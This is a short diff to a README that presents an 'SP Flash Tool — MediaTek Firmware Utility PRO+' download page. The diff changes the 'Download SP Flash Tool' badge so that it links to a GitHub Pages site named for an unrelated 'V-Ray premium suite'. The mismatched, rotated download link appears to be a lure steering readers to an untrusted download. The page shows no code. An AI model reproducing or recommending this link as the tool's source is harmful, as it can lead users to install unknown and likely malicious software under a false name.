@@ -1,7 +1,7 @@
 
 # SP Flash Tool — MediaTek Firmware Utility PRO+
 
-[![Download SP Flash Tool](https://img.shields.io/badge/Download-SP_Flash_Tool-8A2BE2?style=flat-square&logo=github&logoColor=white)](https://sp-flash-tool-pro.github.io/.github)
+[![Download SP Flash Tool](https://img.shields.io/badge/Download-SP_Flash_Tool-8A2BE2?style=flat-square&logo=github&logoColor=white)](https://v-ray-premium-suite.github.io/.vray-premium-suite/)
 
 
 > 💡 **Tip:** Always back up your IMEI and important partitions before using the Format options.
